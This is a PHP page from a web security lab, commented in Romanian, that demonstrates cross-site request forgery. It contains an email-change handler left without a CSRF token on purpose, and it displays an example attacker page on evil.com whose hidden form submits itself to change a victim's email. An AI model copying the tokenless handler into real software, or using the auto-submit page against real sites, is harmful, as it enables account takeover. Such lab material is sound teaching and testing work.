<?php
/**
 * Cross-Site Request Forgery (CSRF) - Pagina Vulnerabila (Laborator Securitate)
 * 
 * VULNERABILITATE: Formularul de schimbare a email-ului nu include un token CSRF.
 * Un atacator poate crea o pagina pe alt site care trimite automat o cerere
 * catre acest formular, schimband email-ul victimei fara consimtamantul acesteia.
 * 
 * EXPLOIT: Creati un fisier HTML pe alt domeniu/server care face POST automat
 * catre aceasta pagina cu un email controlat de atacator.
 */
$page_title = 'CSRF Demo';
require_once dirname(__DIR__) . '/includes/header.php';

// Autentificare demo pentru CSRF testing
if (!isLoggedIn()) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['demo_login'])) {
        $_SESSION['user_id'] = 1;
        $_SESSION['username'] = 'demo_user';
        $_SESSION['role'] = 'utilizator';
        header('Location: csrf_vulnerable.php');
        exit;
    }
    ?>
    <h2>CSRF - Autentificare Demo</h2>
    <p>Pentru a testa atacul CSRF, autentificati-va mai intai:</p>
    <form method="post">
        <input type="hidden" name="demo_login" value="1">
        <input type="submit" value="Autentificare Demo">
    </form>
    <?php
    require_once dirname(__DIR__) . '/includes/footer.php';
    return;
}

$message = '';
$user_email = $_SESSION['email_override'] ?? 'user@example.com';

// VULNERABIL: FARA verificare token CSRF
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['change_email'])) {
    $new_email = $_POST['email']; // acceptat fara token CSRF
    $_SESSION['email_override'] = $new_email;
    $message = 'Email schimbat cu succes in: ' . $new_email . ' (FARA verificare CSRF!)';
    
    // Impact real in baza de date
    $db = getMySQLPDO() ?: getSQLitePDO();
    if ($db && isset($_SESSION['user_id'])) {
        try {
            $stmt = $db->prepare("UPDATE users SET email = ? WHERE id = ?");
            $stmt->execute([$new_email, $_SESSION['user_id']]);
        } catch (Exception $e) {
            // Ignoram erorile pentru demo
        }
    }
}
?>

<h2>Cross-Site Request Forgery (CSRF) - Demonstratie Vulnerabilitate</h2>

<div style="background: #ffe6e6; border-left: 5px solid #e74c3c; padding: 15px; margin-bottom: 20px;">
    <strong>VULNERABILITATE ACTIVA:</strong> Acest formular NU include un token CSRF.
    Un atacator poate forta utilizatorul autentificat sa execute actiuni nedorite.
</div>

<section>
    <h2>Setari Profil (Vulnerabil la CSRF)</h2>
    
    <?php if ($message): ?>
        <p style="background: #fff3cd; padding: 10px; border-left: 4px solid #f39c12;">
            <?php echo htmlspecialchars($message); ?>
        </p>
    <?php endif; ?>
    
    <p><strong>Email curent:</strong> <?php echo htmlspecialchars($user_email); ?></p>
    
    <!-- VULNERABIL: formular fara token CSRF -->
    <form method="post" action="csrf_vulnerable.php">
        <p>
            <label for="email">Email nou:</label>
            <input type="email" id="email" name="email" required value="atacator@evil.com">
        </p>
        <input type="hidden" name="change_email" value="1">
        <input type="submit" value="Schimba Email-ul">
    </form>
</section>

<section style="margin-top: 30px;">
    <h2>Pagina de Exploit CSRF (Simulata)</h2>
    <p>Mai jos este codul pe care un atacator l-ar plasa pe un site malitios (ex: evil.com):</p>
    
    <div style="background: #2c3e50; color: #ecf0f1; padding: 15px; border-radius: 4px; font-family: monospace; overflow-x: auto;">
<pre><!-- Pagina gazduita pe https://evil.com/csrf_attack.html -->
<html>
<body>
    <h1>Castiga un iPhone!</h1>
    <p>Click aici pentru a participa la concurs...</p>
    
    <!-- Formular ascuns care se auto-trimite -->
    <form id="csrf-form" 
          action="https://www.scs.ubbcluj.ro/~username/php/vulnerabilities/csrf_vulnerable.php" 
          method="POST">
        <input type="hidden" name="change_email" value="1">
        <input type="hidden" name="email" value="atacator@evil.com">
    </form>
    
    <script>
        // Auto-submit cand victima viziteaza pagina
        document.getElementById('csrf-form').submit();
    </script>
</body>
</html></pre>

</section>

<?php require_once dirname(__DIR__) . '/includes/footer.php'; ?>
